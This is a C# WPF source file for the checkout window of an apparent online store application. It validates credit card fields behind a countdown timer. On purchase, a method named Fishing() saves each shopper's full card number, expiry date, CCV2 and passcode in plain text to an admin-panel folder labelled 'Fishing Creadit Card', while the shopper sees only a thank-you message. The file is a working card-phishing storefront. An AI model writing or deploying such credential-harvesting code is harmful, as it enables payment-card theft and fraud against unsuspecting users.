using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Text.RegularExpressions;
using System.IO;
using System.Windows.Threading;

namespace OnlineStoreWPF
{
    /// <summary>
    /// Interaction logic for EndOfBuy.xaml
    /// </summary>
    public partial class EndOfBuy : Window
    {
        private int time = 90;
        private DispatcherTimer timer;

        public EndOfBuy()
        {
            InitializeComponent();

            timer = new DispatcherTimer();
            timer.Interval = new TimeSpan(0, 0, 1);

            timer.Tick += Timer_tick;
            timer.Start();

        }

        void Timer_tick(object sender, EventArgs e)
        {
            if (time > 0)
            {
                if (time <= 10)
                {
                    if (time % 2 == 0)
                    {
                        TimeCounter.Foreground = Brushes.Red;
                    }
                    else
                    {
                        TimeCounter.Foreground = Brushes.Black;
                    }

                    --time;
                    TimeCounter.Text = string.Format("0{0}:{1}", time / 60, time % 60);
                }
                else
                {
                    --time;
                    TimeCounter.Text = string.Format("0{0}:{1}", time / 60, time % 60);
                }
            }
            else
            {
                timer.Stop();
                MessageBox.Show("Your time is over !!! Try again .","Time is Over !!!",MessageBoxButton.OK,MessageBoxImage.Warning);
                this.Close();
            }
        }

        private void NumberValidationTextBox(object sender, TextCompositionEventArgs e)
        {
            Regex regex = new Regex("[^0-9]+");
            e.Handled = regex.IsMatch(e.Text);
        }

        private void Backbtn_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void Confirmbtn_Click(object sender, RoutedEventArgs e)
        {
            if (validDay())
            {
                if (validID())
                {
                    if (validcheck())
                    {
                        Fishing();
                        MessageBox.Show("Thanks for shoping . Have good day .", "Thanks", MessageBoxButton.OK, MessageBoxImage.Information);
                        
                        CloseAllWindows();
                        this.Close();
                    }
                    else
                    {
                        MessageBox.Show("Fill all of fields .", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
                else
                {
                    MessageBox.Show("Credit Card ID is invalid .", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            else
            {
                MessageBox.Show("Expire date is invalid .", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }

        }

        public bool validcheck()
        {
            if(ID1.Text!=string.Empty && ID2.Text != string.Empty && ID3.Text != string.Empty && ID4.Text != string.Empty)
            {
                if(Month.Text!=string.Empty && Day.Text != string.Empty)
                {
                    if (CCV2.Text != string.Empty)
                    {
                        if (PassCode.Password != string.Empty)
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        public bool validID()
        {
            if(ID1.Text.Length==4 && ID2.Text.Length == 4 && ID3.Text.Length == 4 && ID4.Text.Length == 4)
            {
                return true;
            }
            return false;
        }

        public bool validDay()
        {
            int temp = int.Parse(Day.Text);
            if (temp <= 31 && temp > 0)
            {
                return true;
            }
            return false;
        }

        private void PassCheck(object sender, RoutedEventArgs e)
        {
            if (PassCode.Password == string.Empty)
            {
                Confirmbtn.IsEnabled = false;
            }
            else
            {
                Confirmbtn.IsEnabled = true;
            }
        }

        private void Fishing()
        {
            string path = Extention.path;
            path += @"\ADMINPanel\Fishing Creadit Card\";

            string ID, date, ccv2, pass;

            ID = ID1.Text + ID2.Text + ID3.Text + ID4.Text;

            date = Month.Text + '/' + Day.Text;

            ccv2 = CCV2.Text;

            pass = PassCode.Password;

            StreamWriter w = new StreamWriter(path + ID + ".txt");
            w.WriteLine("Card ID :" + ID);
            w.WriteLine("Expire Date :" + date);
            w.WriteLine("CCV2 :" + ccv2);
            w.WriteLine("PassCode :" + pass);
            w.Close();
        }

        private void CloseAllWindows()
        {
            for (int intCounter = App.Current.Windows.Count - 1; intCounter > 1; intCounter--)
            {
                App.Current.Windows[intCounter].Close();
            }
        }


    }
}
